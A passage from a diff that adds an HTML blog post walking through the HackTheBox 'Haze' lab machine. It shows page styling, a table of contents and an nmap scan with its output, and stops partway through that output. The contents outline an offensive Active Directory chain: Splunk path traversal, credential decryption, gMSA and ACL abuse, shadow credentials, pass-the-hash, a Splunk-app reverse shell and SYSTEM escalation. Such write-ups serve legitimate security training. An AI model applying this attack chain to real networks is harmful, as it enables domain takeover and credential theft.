@@ -1,0 +1,1894 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Haze HTB Walkthrough: Full Active Directory Compromise">
+    <meta property="og:description" content="A comprehensive walkthrough of Haze Machine From HackTheBox detailing enumeration, Splunk exploitation, gMSA abuse, AD ACL attacks, and privilege escalation to achieve full domain compromise.">
+    <meta property="og:image" content="../images/Haze.png"> 
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="../images/Haze.png"> 
+    <meta property="og:url" content="#"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="twitter:title" content="Haze HTB Walkthrough: Full Active Directory Compromise">
+    <meta name="twitter:description" content="A comprehensive walkthrough of Haze Machine From HackTheBox, detailing enumeration, Splunk exploitation, gMSA abuse, AD ACL attacks, and privilege escalation to achieve full domain compromise.">
+    <title>Haze HTB Walkthrough | Bashir Kabir Zarewa</title>
+    <meta name="description" content="Detailed walkthrough of Haze Machine From HackTheBox, a challenging Active Directory machine, covering enumeration, exploitation, and privilege escalation techniques to achieve full domain compromise.">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #34495e;
+            --accent: #3498db;
+            --light-gray: #f5f7fa;
+            --medium-gray: #e1e5eb;
+            --dark-gray: #7f8c8d;
+            --text: #2c3e50;
+            --text-light: #95a5a6;
+            --white: #ffffff;
+            --shadow: 0 4px 16px rgba(44, 62, 80, 0.10);
+            --border-radius: 14px;
+            --transition: 0.3s cubic-bezier(.4,2,.6,1);
+            --font-main: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            font-family: var(--font-main);
+            background: linear-gradient(120deg, var(--light-gray) 60%, #fdecea 100%);
+            color: var(--text);
+            line-height: 1.7;
+            font-size: 1.08rem;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 1.2rem;
+        }
+
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: var(--white);
+            padding: 2.5rem 0 2rem 0;
+            margin-bottom: 2.5rem;
+            box-shadow: var(--shadow);
+            position: relative;
+            border-radius: 0 0 24px 24px;
+        }
+
+        .header-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .profile-container {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            border: 4px solid var(--white);
+            overflow: hidden;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .profile-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .blog-title {
+            font-size: 3.0rem;
+            font-weight: 800;
+            margin-bottom: 0.3rem;
+            letter-spacing: 0px;
+            text-shadow: 0 2px 8px rgba(44,62,80,0.08);
+        }
+
+        .blog-subtitle {
+            font-size: 1.1rem;
+            font-weight: 400;
+            opacity: 0.92;
+            margin-bottom: 1.5rem;
+            color: #e1e5eb;
+        }
+
+        nav {
+            width: 100%;
+            max-width: 600px;
+            margin-top: 0.5rem;
+        }
+
+        .nav-links {
+            display: flex;
+            justify-content: center;
+            list-style: none;
+            gap: 1.2rem;
+            padding: 0;
+            flex-wrap: wrap;
+        }
+
+        .nav-links a {
+            color: var(--white);
+            text-decoration: none;
+            font-size: 1.08rem;
+            font-weight: 600;
+            padding: 0.5rem 1.1rem;
+            border-radius: var(--border-radius);
+            transition: background var(--transition), color var(--transition);
+            letter-spacing: 0.02em;
+        }
+
+        .nav-links a:hover,
+        .nav-links a.active {
+            background-color: rgba(255,255,255,0.18);
+            color: #fff;
+        }
+
+        /* Post Content */
+        .post-content {
+            background: var(--white);
+            border-radius: var(--border-radius);
+            padding: 3rem;
+            box-shadow: var(--shadow);
+            margin-bottom: 4rem;
+        }
+
+        .post-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .post-title {
+            font-size: 2.3rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: var(--primary);
+            line-height: 1.3;
+        }
+
+        .post-subtitle {
+            font-size: 1.2rem;
+            color: var(--dark-gray);
+            margin-bottom: 1.5rem;
+            font-weight: 400;
+        }
+
+        .post-meta {
+            display: flex;
+            justify-content: center;
+            gap: 1.2rem;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            background: var(--light-gray);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.98rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .meta-item i {
+            margin-right: 5px;
+            color: var(--accent);
+        }
+
+        .post-cover {
+            width: 70%;
+            height: auto;
+            border-radius: var(--border-radius);
+            margin-bottom: 2rem;
+            box-shadow: var(--shadow);
+            max-height: 590px;
+            object-fit: cover;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .inline-image {
+            width: 70%;
+            display: block;
+            margin: 2.5rem auto;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            max-height: 500px;
+            object-fit: cover;
+        }
+
+        .share-buttons {
+            text-align: center;
+            margin: 1.5rem 0;
+        }
+
+        .share-buttons button,
+        .share-buttons a {
+            font-size: 1rem;
+        }
+
+        .post-body p {
+            margin-bottom: 1.5rem;
+            line-height: 1.7;
+            font-size: 1.08rem;
+        }
+        .scenario {
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            padding: 1rem 1.5rem;
+            border-radius: var(--border-radius);
+            margin: 1.5rem 0;
+            font-style: italic;
+        }
+        
+        .scenario .highlight {
+            font-style: normal;
+        }
+
+        .post-body code {
+            background-color: var(--medium-gray);
+            padding: 0.2em 0.4em;
+            margin: 0;
+            font-size: 85%;
+            border-radius: 6px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        /* New: Terminal Code Block Styling */
+        .terminal-code {
+            background-color: #282c34; /* Dark background like a terminal */
+            color: #abb2bf; /* Light gray text */
+            font-family: 'Fira Code', 'Cascadia Code', 'Consolas', 'Monaco', monospace; /* Monospaced font */
+            font-size: 0.95rem;
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
+            margin: 2.5rem 0;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);
+            overflow-x: auto; /* Enable horizontal scrolling for long lines */
+        }
+
+        .terminal-code pre {
+            margin: 0;
+            padding: 0;
+            white-space: pre-wrap; /* Wrap long lines */
+            word-break: break-all; /* Break words if necessary */
+        }
+
+        .terminal-code .prompt {
+            color: #61afef; /* Blue for prompt */
+            user-select: none; /* Prevent selection of prompt */
+        }
+
+        .terminal-code .command {
+            color: #c678dd; /* Purple for command */
+        }
+
+        .terminal-code .output {
+            color: #abb2bf; /* Default text color for output */
+        }
+
+        .post-body h2 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin: 3rem 0 1.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--medium-gray);
+            position: relative;
+            color: var(--primary);
+        }
+
+        .post-body h2::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 60px;
+            height: 2px;
+            background-color: var(--accent);
+        }
+
+        .post-body h3 {
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin: 2rem 0 1rem;
+            color: var(--primary);
+        }
+        
+        .post-body .highlight {
+            font-weight: 600;
+            color: var(--accent);
+        }
+        
+        .post-body a {
+            color: var(--accent);
+            text-decoration: none;
+            border-bottom: 1px dotted var(--accent);
+            transition: color 0.2s, border-bottom-color 0.2s;
+        }
+        
+        .post-body a:hover {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+        }
+
+        .post-body ul, .post-body ol {
+            margin-bottom: 1.5rem;
+            padding-left: 1.5rem;
+        }
+
+        .post-body li {
+            margin-bottom: 0.8rem;
+            line-height: 1.6;
+        }
+
+        .highlight-box {
+            background: rgba(52, 152, 219, 0.1);
+            border-left: 4px solid var(--accent);
+            padding: 1.2rem;
+            margin: 2rem 0;
+            border-radius: 0 var(--border-radius) var(--border-radius) 0;
+        }
+
+        .highlight-box p {
+            margin-bottom: 0;
+        }
+
+        .cta-box {
+            background: var(--primary);
+            color: var(--white);
+            padding: 1.5rem;
+            border-radius: var(--border-radius);
+            margin: 3rem 0;
+            text-align: center;
+        }
+
+        .cta-box h3 {
+            color: var(--white);
+            margin-bottom: 1rem;
+        }
+
+        .cta-box p a {
+            color: var(--white);
+            text-decoration: underline;
+        }
+
+        /* New: Table of Contents Styling */
+        .table-of-contents {
+            background: var(--light-gray);
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
+            margin-bottom: 2.5rem;
+            box-shadow: inset 0 2px 8px rgba(44, 62, 80, 0.05);
+        }
+
+        .table-of-contents h4 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-top: 0;
+            margin-bottom: 1rem;
+            color: var(--primary);
+            border-bottom: 1px solid var(--medium-gray);
+            padding-bottom: 0.5rem;
+        }
+
+        .table-of-contents ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .table-of-contents ul li {
+            margin-bottom: 0.5rem;
+        }
+
+        .table-of-contents ul li a {
+            display: block;
+            padding: 0.4rem 0.6rem;
+            color: var(--text);
+            text-decoration: none;
+            border-bottom: none; /* Remove dotted line for TOC links */
+            transition: background-color 0.2s ease-in-out, color 0.2s ease-in-out;
+            border-radius: 6px;
+        }
+
+        .table-of-contents ul li a:hover {
+            background-color: var(--medium-gray);
+            color: var(--primary);
+        }
+
+        .table-of-contents ul ul { /* Nested lists for sub-sections */
+            margin-top: 0.5rem;
+            margin-left: 1rem;
+            border-left: 2px solid var(--medium-gray);
+            padding-left: 0.8rem;
+        }
+
+        /* New: Author Bio Section */
+        .author-bio {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+            background: var(--light-gray);
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
+            margin-top: 3rem;
+            box-shadow: var(--shadow);
+        }
+
+        .author-bio .bio-image {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid var(--accent);
+            flex-shrink: 0; /* Prevent image from shrinking */
+        }
+
+        .author-bio .bio-text h3 {
+            margin-top: 0;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+            font-size: 1.3rem;
+        }
+
+        .author-bio .bio-text p {
+            margin-bottom: 0;
+            font-size: 0.98rem;
+            color: var(--dark-gray);
+        }
+
+        .author-bio .bio-text p a {
+            font-weight: 600;
+            color: var(--accent);
+            text-decoration: none;
+            border-bottom: 1px dotted var(--accent);
+        }
+        .author-bio .bio-text p a:hover {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+        }
+
+        /* New: Related Posts Styling */
+        .related-posts {
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px dashed var(--medium-gray);
+        }
+
+        .related-posts h2 {
+            text-align: center;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            color: var(--primary);
+            position: relative;
+            display: inline-block; /* For the pseudo-elements positioning */
+            margin-left: auto;
+            margin-right: auto;
+            border-bottom: none; /* Remove default h2 border */
+            padding-bottom: 0;
+        }
+        /* Fancy underline for related posts */
+        .related-posts h2::before,
+        .related-posts h2::after {
+            content: '';
+            position: absolute;
+            bottom: -5px; /* Adjust as needed */
+            height: 2px;
+            background-color: var(--accent);
+            width: 30%; /* Shorter line */
+        }
+
+        .related-posts h2::before {
+            left: 10%; /* Positioning to center */
+        }
+
+        .related-posts h2::after {
+            right: 10%; /* Positioning to center */
+        }
+
+        .related-posts ul {
+            list-style: none;
+            padding: 0;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .related-posts ul li {
+            background: var(--light-gray);
+            border-radius: var(--border-radius);
+            padding: 1.2rem 1.5rem;
+            box-shadow: var(--shadow);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            display: flex;
+            align-items: center; /* Vertically align content */
+        }
+
+        .related-posts ul li:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(44, 62, 80, 0.15);
+        }
+
+        .related-posts ul li a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.05rem;
+            line-height: 1.4;
+            flex-grow: 1; /* Allow link to take full space */
+            border-bottom: none; /* Remove dotted line */
+        }
+        .related-posts ul li a:hover {
+            color: var(--accent);
+            border-bottom: none; /* Ensure no border on hover too */
+        }
+
+
+        /* Footer */
+        footer {
+            background: var(--primary);
+            color: var(--white);
+            padding: 2.2rem 0 1.2rem 0;
+            margin-top: 3rem;
+            border-radius: 24px 24px 0 0;
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 2rem;
+        }
+
+        .footer-section {
+            flex: 1;
+            min-width: 180px;
+            margin-bottom: 1.2rem;
+            padding-right: 1.2rem;
+        }
+
+        .footer-title {
+            font-size: 1.15rem;
+            margin-bottom: 1.1rem;
+            position: relative;
+            padding-bottom: 0.4rem;
+            font-weight: 700;
+        }
+
+        .footer-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 32px;
+            height: 2px;
+            background-color: var(--accent);
+            border-radius: 2px;
+        }
+        
+        .footer-section p {
+            font-size: 1rem;
+            color: rgba(255,255,255,0.85);
+        }
+
+        .footer-links {
+            list-style: none;
+            padding: 0;
+        }
+
+        .footer-links li {
+            margin-bottom: 0.7rem;
+        }
+
+        .footer-links a {
+            color: rgba(255,255,255,0.85);
+            text-decoration: none;
+            transition: color var(--transition);
+            font-size: 1rem;
+        }
+
+        .footer-links a:hover {
+            color: var(--accent);
+        }
+        
+        .social-links {
+            display: flex;
+            gap: 0.8rem;
+            margin-top: 0.7rem;
+        }
+
+        .social-links a {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            background: rgba(255,255,255,0.13);
+            border-radius: 50%;
+            color: var(--white);
+            text-decoration: none;
+            font-size: 18px;
+            transition: background var(--transition), transform var(--transition);
+        }
+
+        .social-links a:hover {
+            background: var(--accent);
+            transform: translateY(-3px) scale(1.08);
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 1.2rem;
+            margin-top: 1.2rem;
+            border-top: 1px solid rgba(255,255,255,0.13);
+            color: rgba(255,255,255,0.7);
+            font-size: 0.95rem;
+        }
+
+        /* --- RESPONSIVE BREAKPOINTS --- */
+        @media (max-width: 480px) {
+            .nav-links {
+                flex-direction: column;
+                gap: 0.5rem;
+                align-items: center;
+            }
+            .nav-links a {
+                width: calc(100% - 2.2rem);
+                text-align: center;
+                padding: 0.6rem 1.1rem;
+            }
+        }
+
+        
+
+        /* Responsive Footer */
+        @media (max-width: 900px) {
+            .footer-content {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 1.5rem;
+            }
+            .footer-section {
+                min-width: 0;
+                padding-right: 0;
+                width: 100%;
+            }
+        }
+        @media (max-width: 480px) {
+            .footer-content {
+                gap: 1rem;
+            }
+            .footer-section {
+                font-size: 0.95rem;
+            }
+            .footer-title {
+                font-size: 1rem;
+            }
+        }
+        @media (max-width: 1100px) {
+            .container {
+                max-width: 98vw;
+                padding: 0 0.5rem;
+            }
+            .post-content {
+                padding: 1.5rem;
+            }
+            .post-cover, .inline-image {
+                max-height: 400px;
+                width: 90%;
+            }
+        }
+
+        @media (max-width: 900px) {
+            .footer-content {
+                flex-direction: column;
+                gap: 1.2rem;
+            }
+            .footer-section {
+                min-width: 120px;
+                padding-right: 0;
+            }
+        }
+
+        @media (max-width: 700px) {
+            .profile-container {
+                width: 70px;
+                height: 70px;
+            }
+            .blog-title {
+                font-size: 1.25rem;
+            }
+            .blog-subtitle {
+                font-size: 0.98rem;
+            }
+            .post-title {
+                font-size: 1.5rem;
+            }
+            .post-subtitle {
+                font-size: 1rem;
+            }
+            .post-content {
+                padding: 0.7rem 0.3rem;
+            }
+            .post-header {
+                margin-bottom: 1.5rem;
+            }
+            .post-meta {
+                gap: 0.5rem;
+                font-size: 0.93rem;
+            }
+            .post-cover, .inline-image {
+                max-height: 400px;
+                width: 100%;
+            }
+            .highlight-box {
+                padding: 0.7rem 0.7rem 0.7rem 1rem;
+            }
+            .cta-box {
+                padding: 1rem;
+            }
+            .author-bio {
+                flex-direction: column;
+                text-align: center;
+            }
+            .author-bio .bio-image {
+                margin-bottom: 0.5rem;
+            }
+            .related-posts h2::before,
+            .related-posts h2::after {
+                width: 20%;
+                left: 0;
+                right: 0;
+                margin: auto;
+            }
+            .terminal-code {
+                padding: 1rem;
+                font-size: 0.85rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .profile-container {
+                width: 100px;
+                height: 100px;
+                margin-bottom: 0.7rem;
+            }
+            .blog-title {
+                font-size: 2rem;
+            }
+            .blog-subtitle {
+                font-size: 0.85rem;
+            }
+            .post-title {
+                font-size: 1.2rem;
+            }
+            .post-subtitle {
+                font-size: 0.9rem;
+            }
+            .footer-title {
+                font-size: 0.98rem;
+            }
+            .footer-links a {
+                font-size: 0.93rem;
+            }
+            .copyright {
+                font-size: 0.85rem;
+            }
+            .post-content {
+                padding: 0.5rem 0.1rem;
+            }
+            .post-header {
+                margin-bottom: 1rem;
+            }
+            .post-meta {
+                gap: 0.3rem;
+                font-size: 0.9rem;
+            }
+            .post-cover, .inline-image {
+                max-height: 350px;
+                width: 100%;
+            }
+            .related-posts ul {
+                grid-template-columns: 1fr; /* Stack on smaller screens */
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="profile-container">
+                    <img src="../images/profile.jpg" alt="Bashir Kabir Zarewa" class="profile-image">
+                </div>
+                <h1 class="blog-title">Bashir Kabir Zarewa</h1>
+                <p class="blog-subtitle">Thoughts on Hacking, AI, Security, and Personal Development.</p>
+                <nav>
+                    <ul class="nav-links">
+                        <li><a href="../index.html">Posts</a></li>
+                        <li><a href="../whoami.html">Whoami</a></li>
+                        <li><a href="../tools.html">Write Ups</a></li>
+                         <li><a href="../tools.html">Tools</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="post-content">
+            <div class="post-header">
+                <h1 class="post-title">Haze Machine Walkthrough From HackTheBox: Full Active Directory Compromise</h1>
+                <p class="post-subtitle">A comprehensive guide to Haze Machine From HackTheBox, detailing enumeration, Splunk exploitation, gMSA abuse, AD ACL attacks, and privilege escalation to achieve full domain compromise.</p>
+                <div class="post-meta">
+                    <div class="meta-item">
+                        <i class="fas fa-calendar-alt"></i> Published: 3rd July 2025
+                    </div>
+                    <div class="meta-item">
+                        <i class="fas fa-tags"></i> HTB, Active Directory, Offensive Security
+                    </div>
+                </div>
+                <img src="../images/Haze.png" alt="Abstract network diagram representing Active Directory compromise" class="post-cover"> <!-- Placeholder for cover image -->
+            </div>
+            <div class="share-buttons" style="text-align:center; margin: 1.5rem 0;">
+                <button id="nativeShareBtn" style="background: var(--accent); color: #fff; border: none; border-radius: 6px; padding: 0.6rem 1.2rem; font-size: 1rem; cursor: pointer; margin-bottom: 0.7rem;">
+                    <i class="fas fa-share-alt"></i> Share This Post
+                </button>
+                <div style="margin-top: 0.7rem;">
+                    <a href="#" id="twitterShare" title="Share on Twitter" style="margin:0 8px; color: #1da1f2;"><i class="fab fa-twitter fa-lg"></i></a>
+                    <a href="#" id="facebookShare" title="Share on Facebook" style="margin:0 8px; color: #1877f3;"><i class="fab fa-facebook fa-lg"></i></a>
+                    <a href="#" id="linkedinShare" title="Share on LinkedIn" style="margin:0 8px; color: #0077b5;"><i class="fab fa-linkedin fa-lg"></i></a>
+                    <a href="#" id="whatsappShare" title="Share on WhatsApp" style="margin:0 8px; color: #25d366;"><i class="fab fa-whatsapp fa-lg"></i></a>
+                    <a href="#" id="copyLink" title="Copy Link" style="margin:0 8px; color: #555;"><i class="fas fa-link fa-lg"></i></a>
+                </div>
+                <div class="share-buttons" style="text-align:center; margin: 1.5rem 0;">
+                    <button id="nativeShareBtn" style="background: var(--accent); color: #fff; border: none; border-radius: 6px; padding: 0.6rem 1.2rem; font-size: 1rem; cursor: pointer; margin-bottom: 0.7rem;">
+                        <i class="fas fa-share-alt"></i> Share This Post
+                    </button>
+                    <button id="upvoteBtn" style="background: #18a106; color: #fff; border: none; border-radius: 6px; padding: 0.6rem 1.2rem; font-size: 1rem; cursor: pointer; margin-left: 10px;">
+                        <i class="fas fa-thumbs-up"></i> Upvote <span id="upvoteCount">0</span>
+                    </button>
+                </div>
+            </div>
+            <div class="post-body">
+                <p>Welcome to a detailed walkthrough of <strong>Haze Machine</strong>, a challenging Active Directory machine that served as an exceptional learning experience. This write-up provides a comprehensive journey through the enumeration, exploitation, and privilege escalation techniques that led to full domain compromise. The objective of this guide is to illuminate common misconfigurations and complex attack paths within Active Directory environments, offering practical insights for cybersecurity professionals and enthusiasts.</p>
+
+                <!-- Table of Contents -->
+                <div class="table-of-contents">
+                    <h4>Table of Contents</h4>
+                    <ul>
+                        <li><a href="#initial-enum">1. Initial Enumeration & Analysis</a>
+                            <ul>
+                                <li><a href="#nmap-scan">Nmap Scan</a></li>
+                                <li><a href="#initial-findings">Initial Findings and Analysis</a></li>
+                                <li><a href="#vulnerabilities-identified">Vulnerabilities Identified</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#splunk-path-traversal">2. Exploiting Splunk Path Traversal (CVE-2024-36991)</a>
+                            <ul>
+                                <li><a href="#extracted-info">Extracted Information</a></li>
+                                <li><a href="#exploit-details">Exploit</a></li>
+                                <li><a href="#attack-path">Attack Path</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#password-decryption">3. Password Decryption and Initial Domain Access</a>
+                            <ul>
+                                <li><a href="#splunk-password-decryption">Splunk Password Decryption</a></li>
+                                <li><a href="#username-enumeration">Username Enumeration & Authentication Testing</a></li>
+                                <li><a href="#domain-users-enumeration">Domain Users Enumeration using --rid-brute</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#gMSA">4. Leveraging Group Managed Service Accounts (gMSA)</a>
+                            <ul>
+                                <li><a href="#understanding-gmsa">Understanding gMSA Exploitation</a></li>
+                                <li><a href="#machine-account-creation">Machine Account Creation (Privilege Escalation for BloodHound)</a></li>
+                                <li><a href="#kerberos-ticket-acquisition">Kerberos Ticket Acquisition</a></li>
+                                <li><a href="#bloodhound-data">BloodHound Data Collection</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#password-spraying">5. Password Spraying for Lateral Movement</a>
+                            <ul>
+                                <li><a href="#performing-spray">Performing the Password Spray</a></li>
+                                <li><a href="#winrm-access">Confirming WinRM Access</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#privilege-escalation">6. Deep Dive into Privilege Escalation (Mark.Adams & gMSA)</a>
+                            <ul>
+                                <li><a href="#mark-adams-permissions">BloodHound Visualization: Mark.Adams Permissions</a></li>
+                                <li><a href="#enumerating-gmsas">Enumerating gMSAs via Evil-WinRM</a></li>
+                                <li><a href="#identifying-acls">Identifying ACLs for gMSA Password Retrieval</a></li>
+                                <li><a href="#initial-failure">Attempting to Retrieve gMSA Password (Initial Failure)</a></li>
+                                <li><a href="#modifying-principal">Modifying principalAllowToRetrievePassword</a></li>
+                                <li><a href="#successful-retrieval">Successful gMSA Password Retrieval</a></li>
+                                <li><a href="#pass-the-hash-haze-it">Pass-the-Hash with Haze-IT-Backup$</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#escalating-edward-martin">7. Escalating Privileges to edward.martin</a>
+                            <ul>
+                                <li><a href="#haze-it-permissions">BloodHound Visualization: HAZE-IT-BACKUP$ Permissions</a></li>
+                                <li><a href="#writeowner-support-services">Exploiting WriteOwner for SUPPORT_SERVICES</a></li>
+                                <li><a href="#add-to-support">Adding Haze-IT-Backup$ to SUPPORT_SERVICES</a></li>
+                                <li><a href="#shadow-credentials">Shadow Credentials Attack on edward.martin</a></li>
+                                <li><a href="#extract-edward-hash">Extracting edward.martin's NTLM Hash</a></li>
+                                <li><a href="#pass-the-hash-edward">Pass-the-Hash with edward.martin</a></li>
+                                <li><a href="#winrm-shell-edward">Establishing edward.martin WinRM Shell</a></li>
+                                <li><a href="#splunk-backup-files">Accessing Splunk Backup Files</a></li>
+                                <li><a href="#analyze-splunk-secret">Analyzing splunk.secret Files</a></li>
+                                <li><a href="#decrypt-splunk-admin">Decrypting Splunk Admin Credentials</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#final-foothold">8. Final Foothold: Reverse Shell via Splunk App</a>
+                            <ul>
+                                <li><a href="#attack-vector">Understanding the Attack Vector</a></li>
+                                <li><a href="#alexander-green-shell">Gaining alexander.green Shell Access</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#privesc-system">9. Privilege Escalation to SYSTEM (SeImpersonatePrivilege)</a>
+                            <ul>
+                                <li><a href="#root-machine">Rooting the Machine</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#conclusion">10. Conclusion</a>
+                            <ul>
+                                <li><a href="#key-takeaways">Key Takeaways</a></li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+
+                <p>Our journey into Haze Machine began, as always, with a thorough reconnaissance phase. Understanding the target's exposed services and potential vulnerabilities is paramount, forming the foundational map for our entire attack.</p>
+
+                <section>
+                    <h2 id="initial-enum"><i class="fas fa-magnifying-glass"></i> 1. Initial Enumeration & Analysis</h2>
+                    <p>Our journey into Haze Machine began, as always, with a thorough reconnaissance phase. Understanding the target's exposed services and potential vulnerabilities is paramount, forming the foundational map for our entire attack.</p>
+
+                    <h3 id="nmap-scan">Nmap Scan</h3>
+                    <p>The first step was a comprehensive Nmap scan to identify open ports, running services, and initial operating system guesses. This initial footprint provides crucial clues about the target's role within the network.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">$</span> <span class="command">nmap -p- -sC -sV 10.10.11.61</span></pre>
+                        <pre class="output">PORT     STATE SERVICE       REASON  VERSION
+53/tcp   open  domain        syn-ack Simple DNS Plus
+88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-06-30 01:53:35Z)
+135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.haze.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
+| Issuer: commonName=haze-DC01-CA/domainComponent=haze
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-03-05T07:12:20
+| Not valid after:  2026-03-05T07:12:20
+| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
+| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
+445/tcp  open  microsoft-ds? syn-ack
+464/tcp  open  kpasswd5?     syn-ack
+593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.haze.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
+| Issuer: commonName=haze-DC01-CA/domainComponent=haze
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-03-05T07:12:20
+| Not valid after:  2026-03-05T07:12:20
+| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
+| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
+3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.haze.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
+| Issuer: commonName=haze-DC01-CA/domainComponent=haze
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-03-05T07:12:20
+| Not valid after:  2026-03-05T07:12:20
+| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
+| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
+3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.haze.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
+| Issuer: commonName=haze-DC01-CA/domainComponent=haze
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-03-05T07:12:20
+| Not valid after:  2026-03-05T07:12:20
+| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
